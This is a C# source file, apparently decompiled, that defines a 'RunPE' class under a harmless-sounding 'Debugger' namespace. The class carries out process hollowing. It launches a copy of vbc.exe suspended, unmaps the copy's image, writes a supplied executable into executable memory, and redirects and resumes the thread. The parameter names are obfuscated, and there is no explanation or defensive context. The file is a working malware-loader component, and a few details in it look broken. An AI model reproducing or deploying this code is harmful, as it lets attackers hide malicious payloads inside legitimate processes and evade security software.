namespace Debugger
{
    using Microsoft.VisualBasic.CompilerServices;
    using System;
    using System.IO;
    using System.Reflection;
    using System.Runtime.InteropServices;
    using System.Text;

    public class RunPE
    {
        [DllImport("kernel32", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
        private static extern bool CreateProcessA([MarshalAs(UnmanagedType.VBByRefStr)] ref string Ÿ, StringBuilder È, IntPtr Û, IntPtr Ò, bool Ã, int Þ, IntPtr Ø, [MarshalAs(UnmanagedType.VBByRefStr)] ref string ß, byte[] Ð, IntPtr[] É);
        [DllImport("kernel32", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
        private static extern bool GetThreadContext(IntPtr Â, uint[] Þ);
        [DllImport("ntdll", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
        private static extern uint NtUnmapViewOfSection(IntPtr Æ, IntPtr Æ);
        public static void PE(byte[] data)
        {
            IntPtr ptr5;
            string location = Assembly.GetEntryAssembly().Location;
            if (Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Contains("x86"))
            {
                location = Conversions.ToString(Environment.SystemDirectory[0]) + @":\Windows\Microsoft.NET\Framework\v2.0.50727\vbc.exe";
                string path = Path.ChangeExtension(Path.Combine(Path.GetTempPath() + Path.GetRandomFileName() + @"\", "vbc"), "exe");
                Directory.CreateDirectory(Path.GetDirectoryName(path));
                File.Copy(location, path);
                location = path;
            }
            byte[] buffer = data;
            int num = BitConverter.ToInt32(buffer, 60);
            int num2 = BitConverter.ToInt16(buffer, num + 6);
            IntPtr ptr4 = new IntPtr(BitConverter.ToInt32(buffer, num + 0x54));
            byte[] buffer2 = new byte[0x44];
            IntPtr[] ptrArray = new IntPtr[4];
            string str4 = null;
            string str5 = null;
            if (CreateProcessA(ref str4, new StringBuilder(location), ptr5, ptr5, false, 4, ptr5, ref str5, buffer2, ptrArray))
            {
                uint[] numArray = new uint[0xb3];
                numArray[0] = 0x10002;
                if (GetThreadContext(ptrArray[1], numArray))
                {
                    IntPtr ptr;
                    IntPtr ptr2;
                    IntPtr ptr6 = new IntPtr(numArray[0x29] + 8L);
                    IntPtr ptr7 = new IntPtr(4);
                    if (ReadProcessMemory(ptrArray[0], ptr6, ref ptr, ptr7, ref ptr2) && (NtUnmapViewOfSection(ptrArray[0], ptr) == 0L))
                    {
                        IntPtr ptr8 = new IntPtr(BitConverter.ToInt32(buffer, num + 0x34));
                        IntPtr ptr9 = new IntPtr(BitConverter.ToInt32(buffer, num + 80));
                        IntPtr ptr3 = VirtualAllocEx(ptrArray[0], ptr8, ptr9, 0x3000, 0x40);
                        bool flag = WriteProcessMemory(ptrArray[0], ptr3, buffer, ptr4, ref ptr2);
                        int num4 = num2 - 1;
                        for (int i = 0; i <= num4; i++)
                        {
                            int[] dst = new int[10];
                            Buffer.BlockCopy(buffer, (num + 0xf8) + (i * 40), dst, 0, 40);
                            byte[] buffer3 = new byte[(dst[4] - 1) + 1];
                            Buffer.BlockCopy(buffer, dst[5], buffer3, 0, buffer3.Length);
                            ptr9 = new IntPtr(ptr3.ToInt32() + dst[3]);
                            ptr8 = new IntPtr(buffer3.Length);
                            flag = WriteProcessMemory(ptrArray[0], ptr9, buffer3, ptr8, ref ptr2);
                        }
                        ptr9 = new IntPtr(numArray[0x29] + 8L);
                        ptr8 = new IntPtr(4);
                        flag = WriteProcessMemory(ptrArray[0], ptr9, BitConverter.GetBytes(ptr3.ToInt32()), ptr8, ref ptr2);
                        numArray[0x2c] = (uint) (ptr3.ToInt32() + BitConverter.ToInt32(buffer, num + 40));
                        SetThreadContext(ptrArray[1], numArray);
                    }
                }
                ResumeThread(ptrArray[1]);
            }
        }

        [DllImport("kernel32", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
        private static extern bool ReadProcessMemory(IntPtr Ø, IntPtr Å, ref IntPtr Ç, IntPtr ß, ref IntPtr Ò);
        [DllImport("kernel32", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
        private static extern int ResumeThread(IntPtr Á);
        [DllImport("kernel32", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
        private static extern bool SetThreadContext(IntPtr Ã, uint[] Ì);
        [DllImport("kernel32", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
        private static extern IntPtr VirtualAllocEx(IntPtr Á, IntPtr Æ, IntPtr Ú, int Û, int Ë);
        [DllImport("kernel32", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
        private static extern bool VirtualProtectEx(IntPtr Ö, IntPtr Ë, IntPtr Ó, int Â, ref int Ð);
        [DllImport("kernel32", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
        private static extern bool WriteProcessMemory(IntPtr Ð, IntPtr Ö, byte[] Æ, IntPtr Ü, ref IntPtr Ù);
    }
}

